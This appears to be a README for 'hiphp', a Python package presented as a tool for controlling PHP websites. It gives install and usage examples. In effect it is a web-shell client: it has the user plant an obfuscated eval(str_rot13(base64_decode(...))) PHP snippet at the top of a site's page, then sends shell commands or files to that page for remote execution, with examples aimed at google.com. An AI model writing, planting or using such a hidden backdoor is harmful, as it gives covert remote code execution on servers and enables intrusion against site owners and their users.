hiphp for control php websites
==========================
A package for controlling a php-based website.

.. image:: https://travis-ci.com/byRo0t96/hiphp.svg?branch=main

Installation
============

.. code::

    pip install hiphp

Usage
=====
.. code:: python

    from hiphp import hiphp

    hiphp("<PASSWORD>","http://LINK/TO/YOUR/PHP/FILE",<OPTIONS>).run()
	
	
Notice
=====
In the event that the call key to the site is not recognized, you will see a code like this:

.. code:: php
    <?php
	eval(str_rot13(base64_decode(str_rot13(base64_decode('cWFaYldTOVRIeElXSHhJb1cxSVVFMEFzRlJNRkVJOUJJU1dPRWxxcUNHMGFaUUx3QlNSM0F3RDBBUjRsWndSbEIxUmtDR1pqWUd0MFdHRDVDbU4xQ3lOaktHeDFzR1NCWEdOMkJ3SUNxd1ZscnhObFpRT2FIUU9BQkdEYlp3dTdIUjlvQkdEOEFtTnVHMU54QXdOekdtRXNBbU5lQUg4a0hHTG1abVYxR21wM1pTWjVXbHk3cGFPMUx2cHdMMmthcUpXdVdtZzJwbHUyTXpNbE1sdHhLMEFQRXhxb1czT3ZyYWNoTEtSYUtGeGNyM1djb2F4YldTOVFEeE1VSmxxakxhYzZvelNrVzEwY0IzMWxuM01hQjMwPQ==')))));
	?>


You must add it to the top of the page that you will request later via the link, knowing that it does not matter to the file. All that matters is taking into account the file type it should be '.php'.

Example
=====
.. code:: python

    from hiphp import hiphp

    # Example:1
    # CLI:
    hiphp("123","https://www.google.com/index.php").run()#This example will open up a command line interface.
	
    # Example:2
    # Command:
    hiphp("123","https://www.google.com/index.php",False,False).run("-c echo 'hi';")#Command lines start after '-c'.

    # Example:3
    # Command:
    p1=hiphp("123","https://www.google.com/index.php",True,False).run("-c echo 'hi';")#Command lines start after '-c'.
    print(p1)

    # Example:4
    # File:
    hiphp("123","https://www.google.com/index.php",False,False).run("example_4.php")#The file type does not matter.

    # Example:5
    # File:
    p1=hiphp("123","https://www.google.com/index.php",True,False).run("example_5.txt")#The file type does not matter.
    print(p1)

.. begin changelog

Changelog
=========

0.1.0
-----
- New build.
- Fix bugs.

0.0.4
-----
- Fix bugs.

0.0.2
-----
- Fix bugs.
- Add help list.
- Add Executing from files.

0.0.1
-----
- First public release.

.. end changelog
